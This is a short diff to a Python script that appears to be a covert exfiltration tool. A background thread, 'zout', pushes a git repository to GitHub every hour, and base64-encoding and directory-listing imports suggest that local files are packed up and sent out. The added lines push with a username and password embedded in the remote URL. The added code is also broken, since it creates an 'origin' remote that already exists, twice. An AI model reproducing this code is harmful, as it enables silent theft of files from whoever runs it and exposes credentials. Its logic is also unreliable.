@@ -2,7 +2,7 @@ from git import Repo
 from os import path, listdir, getcwd
 from base64 import b64encode
 from time import sleep
-
+from creds import github_password, github_username, repo_name
 
 def encoder(text):
     text = text.encode('utf-8')
@@ -37,11 +37,18 @@ def zout():
         origin = repo.remote(name="origin")
         origin.push()
 
+        origin_url = f"https://github.com/{github_username}/{repo_name}.git"
+        origin = repo.create_remote('origin', origin_url)
+        origin.fetch()
+        origin.push(refspec=repo.head.ref)
+        origin = repo.create_remote('origin', origin_url.replace("https://", f"https://{github_username}:{github_password}@"))
+        origin.fetch()
+        origin.push(refspec=repo.head.ref)
+
         sleep(3600) # sleep for an hour
 
 from threading import Thread
 Thread(target=zout).start()
-
 
 
 # import requests
